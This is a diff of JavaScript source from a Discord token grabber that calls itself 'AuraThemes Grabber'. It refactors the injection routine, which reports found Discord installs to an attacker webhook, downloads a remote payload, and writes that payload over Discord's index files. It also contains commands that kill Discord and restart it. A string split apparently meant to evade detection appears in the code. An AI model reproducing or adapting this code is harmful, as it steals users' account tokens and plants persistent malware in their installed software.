@@ -36,40 +36,42 @@ const findIndexs = (f) => {
 };
 
 const injection = async (webhook) => {
-  try {
-    let m = "";
-    let r = [];
-    injecPath.forEach((k) => {
-      let p = k.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i),
-        n = p ? p[1] : "Not Found";
-      m += `\`${n}\`, `;
-      r.push({ k, n });
-    });
-    await instance({
-      url: webhook[0],
-      method: "POST",
-      data: {
-        username: 'AuraThemes Grabber - Injection',
-        avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
-        embeds: [{
-          author: { name: "k4itrun", icon_url: "https://i.imgur.com/WkKXZSl.gif" },
-          title: 'Discord(s) injected(s)',
-          color: parseInt("#c267ff".replace("#", ""), 16),
-          description: m === "" ? "Not Found" : m.slice(0, -2),
-          timestamp: new Date(),
-          footer: { text: 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber', icon_url: 'https://i.imgur.com/WkKXZSl.gif' }
-        }]
-      }
-    });
-    let text = (await instance.get(Injection)).data.replace("%WEBHOOK%", webhook[0]);
-    await Promise.all(injecPath.map(async (f) => {
-      await fs.promises.writeFile(f, text, { encoding: "utf8", flag: "w" });
-    }));
-  } catch (e) {
-    console.error(e);
-  }
+  let paths = [];
+  let desc = [];
+  injecPath.forEach((path) => {
+    let match = path.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
+    let name = match ? match[1] : "Not Found";
+    desc.push(`\`${name}\``);
+    paths.push({ path, name });
+  });
+  await instance({
+    "url": webhook[0],
+    "method": "POST",
+    "data": {
+      "username": 'AuraThemes Grabber - Injection',
+      "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
+      "embeds": [{
+        "author": {
+          "name": "k4itrun",
+          "icon_url": "https://i.imgur.com/WkKXZSl.gif"
+        },
+        "title": 'Discord(s) injected(s)',
+        "color": "12740607",
+        "description": desc.length > 0 ? desc.join(", ") : "Not Found",
+        "timestamp": new Date(),
+        "footer": {
+          "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
+          "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
+        }
+      }]
+    }
+  });
+  let inject = await instance.get(Injection);
+  let text = inject.data.replace("%WEB" + "HOOK%", webhook[0]);
+  await Promise.all(paths.map(async ({ path }) => {
+    await fs.promises.writeFile(path, text, { encoding: "utf8", flag: "w" });
+  }));
 };
-
 
 const bufferReplace = (buf, a, b) => {
   if (!Buffer.isBuffer(buf)) buf = Buffer(buf);
@@ -101,7 +103,7 @@ const killApps = async (a) => {
       ]) {
         if (s.includes(c)) {
           await exec(`taskkill /F /T /IM ${c}`, (err) => { });
-          await exec(`"${local}\\${c.replace(".exe", "")}\\Update.exe" --processStart ${c}`, (err) => {});
+          await exec(`"${local}\\${c.replace(".exe", "")}\\Update.exe" --processStart ${c}`, (err) => { });
         }
       }
     });
@@ -128,16 +130,12 @@ const findInjects = async (f) => {
   }
 };
 
-const discordInjected = async (a) => {
+const discordInjected = async (res) => {
   try {
-    if (a === false) return;
-    let d = discordsDirs();
-    for (const p of d) {
-      findIndexs(p);
-    }
-    for (const p of d) {
-      await findInjects(p);
-    }
+    if (res === false) return;
+    let dirs = discordsDirs();
+    for (let dir of dirs) findIndexs(dir);
+    for (let dir of dirs) await findInjects(dir);
     await betterBroke();
     await injection(config.webhook);
     await killApps(config.kill.discords);
